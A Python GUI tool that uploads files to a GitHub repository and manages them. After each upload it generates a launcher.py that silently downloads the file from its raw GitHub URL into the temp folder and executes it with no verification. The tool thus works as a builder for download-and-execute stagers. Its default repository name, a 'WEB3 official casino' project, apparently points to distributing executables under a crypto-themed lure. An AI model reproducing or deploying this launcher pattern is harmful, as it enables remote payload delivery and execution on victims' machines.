import os
import base64
import requests
import tkinter as tk
from tkinter import filedialog, messagebox, ttk

# Default GitHub settings (pre-filled)
DEFAULT_REPO   = "ossaijeremiah000123/WEB3-official-casino-projectfiles"
DEFAULT_BRANCH = "main"
DEFAULT_FOLDER = "uploads"
DEFAULT_TOKEN  = ""   # Leave empty for safety, paste in GUI at runtime


def upload_file_to_github(repo, branch, folder, token, filepath):
    filename = os.path.basename(filepath)
    with open(filepath, "rb") as f:
        content = f.read()

    b64content = base64.b64encode(content).decode("utf-8")

    api_url = f"https://api.github.com/repos/{repo}/contents/{folder}/{filename}"
    headers = {"Authorization": f"token {token}"}

    data = {
        "message": f"Add {filename}",
        "branch": branch,
        "content": b64content
    }

    r = requests.put(api_url, headers=headers, json=data)
    if r.status_code not in [200, 201]:
        raise Exception(f"GitHub upload failed: {r.status_code} {r.text}")

    raw_url = f"https://github.com/{repo}/raw/{branch}/{folder}/{filename}"
    return raw_url


def delete_file_from_github(repo, branch, folder, token, filename):
    api_url = f"https://api.github.com/repos/{repo}/contents/{folder}/{filename}"
    headers = {"Authorization": f"token {token}"}

    # Get file SHA first
    r = requests.get(api_url, headers=headers, params={"ref": branch})
    if r.status_code != 200:
        raise Exception(f"File not found or cannot fetch: {r.status_code} {r.text}")
    sha = r.json()["sha"]

    data = {
        "message": f"Delete {filename}",
        "branch": branch,
        "sha": sha
    }

    r = requests.delete(api_url, headers=headers, json=data)
    if r.status_code != 200:
        raise Exception(f"GitHub delete failed: {r.status_code} {r.text}")


def list_files_in_folder(repo, branch, folder, token):
    api_url = f"https://api.github.com/repos/{repo}/contents/{folder}"
    headers = {"Authorization": f"token {token}"}
    r = requests.get(api_url, headers=headers, params={"ref": branch})
    if r.status_code != 200:
        raise Exception(f"Failed to list files: {r.status_code} {r.text}")
    return [item["name"] for item in r.json() if item["type"] == "file"]


def generate_launcher(raw_url, save_path):
    launcher_code = f"""
import os, requests, subprocess, tempfile

url = "{raw_url}"
exe_path = os.path.join(tempfile.gettempdir(), os.path.basename(url))

print("Downloading file...")
r = requests.get(url)
with open(exe_path, "wb") as f:
    f.write(r.content)

print("Launching...")
subprocess.Popen([exe_path], shell=True)
"""
    with open(save_path, "w", encoding="utf-8") as f:
        f.write(launcher_code)


def run_gui():
    root = tk.Tk()
    root.title("GitHub File Uploader & Manager")
    root.geometry("600x400")

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True)

    # --- Upload Tab ---
    upload_tab = tk.Frame(notebook)
    notebook.add(upload_tab, text="Upload")

    tk.Label(upload_tab, text="GitHub Repo (owner/name):").pack()
    repo_entry = tk.Entry(upload_tab, width=50)
    repo_entry.insert(0, DEFAULT_REPO)
    repo_entry.pack()

    tk.Label(upload_tab, text="Branch:").pack()
    branch_entry = tk.Entry(upload_tab, width=50)
    branch_entry.insert(0, DEFAULT_BRANCH)
    branch_entry.pack()

    tk.Label(upload_tab, text="Folder in repo:").pack()
    folder_entry = tk.Entry(upload_tab, width=50)
    folder_entry.insert(0, DEFAULT_FOLDER)
    folder_entry.pack()

    tk.Label(upload_tab, text="GitHub Token:").pack()
    token_entry = tk.Entry(upload_tab, width=50, show="*")
    token_entry.insert(0, DEFAULT_TOKEN)
    token_entry.pack()

    def choose_file():
        filepath = filedialog.askopenfilename(title="Select a file to upload")
        if not filepath:
            return

        repo = repo_entry.get().strip()
        branch = branch_entry.get().strip()
        folder = folder_entry.get().strip()
        token = token_entry.get().strip()

        if not token:
            messagebox.showerror("Error", "GitHub token is required!")
            return

        try:
            raw_url = upload_file_to_github(repo, branch, folder, token, filepath)
            launcher_path = os.path.join(os.path.dirname(filepath), "launcher.py")
            generate_launcher(raw_url, launcher_path)
            messagebox.showinfo("Success", f"File uploaded and launcher.py created at:\n{launcher_path}")
        except Exception as e:
            messagebox.showerror("Upload Failed", str(e))

    tk.Button(upload_tab, text="Choose File & Upload", command=choose_file).pack(pady=20)

    # --- Manage Tab ---
    manage_tab = tk.Frame(notebook)
    notebook.add(manage_tab, text="Manage Files")

    tk.Label(manage_tab, text="Files in GitHub uploads folder:").pack()

    file_listbox = tk.Listbox(manage_tab, width=60, height=15)
    file_listbox.pack(pady=10)

    def refresh_file_list():
        file_listbox.delete(0, tk.END)
        repo = repo_entry.get().strip()
        branch = branch_entry.get().strip()
        folder = folder_entry.get().strip()
        token = token_entry.get().strip()
        if not token:
            messagebox.showerror("Error", "GitHub token is required!")
            return
        try:
            files = list_files_in_folder(repo, branch, folder, token)
            for f in files:
                file_listbox.insert(tk.END, f)
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def delete_selected_file():
        selection = file_listbox.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a file to delete.")
            return

        filename = file_listbox.get(selection[0])
        repo = repo_entry.get().strip()
        branch = branch_entry.get().strip()
        folder = folder_entry.get().strip()
        token = token_entry.get().strip()

        try:
            delete_file_from_github(repo, branch, folder, token, filename)
            messagebox.showinfo("Deleted", f"{filename} has been deleted from GitHub.")
            refresh_file_list()
        except Exception as e:
            messagebox.showerror("Delete Failed", str(e))

    tk.Button(manage_tab, text="Refresh File List", command=refresh_file_list).pack(pady=5)
    tk.Button(manage_tab, text="Delete Selected File", command=delete_selected_file).pack(pady=5)

    root.mainloop()


if __name__ == "__main__":
    run_gui()
